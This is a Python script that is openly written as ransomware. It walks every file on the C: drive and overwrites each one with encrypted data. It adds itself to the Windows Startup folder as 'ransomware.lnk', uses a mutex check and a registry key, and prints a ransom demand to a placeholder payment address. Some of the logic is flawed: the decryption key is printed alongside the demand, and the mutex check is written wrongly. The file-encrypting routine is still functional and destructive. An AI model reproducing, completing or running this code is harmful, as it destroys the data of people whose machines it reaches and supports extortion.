import os
import json
import base64
from cryptography.fernet import Fernet
from win32com.shell import shell, shellcon

def load_config():
    with open('config.json', 'r') as file:
        config = json.load(file)
    return config

def generate_key():
    key = Fernet.generate_key()
    return key

def encrypt_file(file_path, key):
    with open(file_path, 'rb') as file:
        data = file.read()
    f = Fernet(key)
    encrypted_data = f.encrypt(data)
    with open(file_path, 'wb') as file:
        file.write(encrypted_data)

def encrypt_files(key):
    for root, dirs, files in os.walk('C:\\'):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)

def add_to_startup():
    config = load_config()
    startup_path = config['startup_path']
    exe_path = os.path.abspath(__file__)
    shell.SHCreateShortcut(os.path.join(startup_path, 'ransomware.lnk'), exe_path)

def main():
    config = load_config()
    mutex_name = config['mutex_name']
    registry_key = config['registry_key']

    # Check if mutex exists
    if os.name == 'nt':
        import win32api
        import win32con
        import win32event
        import winerror

        try:
            handle = win32event.CreateMutex(None, True, mutex_name)
        except win32api.error as e:
            if e.args[0] == winerror.ERROR_ALREADY_EXISTS:
                print("Ransomware is already running.")
                exit()
    else:
        print("Mutex functionality is not available on non-Windows systems.")

    # Check if registry key exists
    try:
        import winreg

        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_key, 0, winreg.KEY_READ)
        winreg.CloseKey(key)
    except FileNotFoundError:
        # Create registry key
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, registry_key)
        winreg.CloseKey(key)

    # Generate encryption key
    encryption_key = generate_key()
    encrypted_key = base64.b64encode(encryption_key).decode('utf-8')

    # Encrypt files
    encrypt_files(encryption_key)

    # Add to startup
    add_to_startup()

    print("Your files have been encrypted. Pay $100 to <PaymentAddress> to decrypt them.")
    print("Encryption key:", encrypted_key)

if __name__ == '__main__':
    main()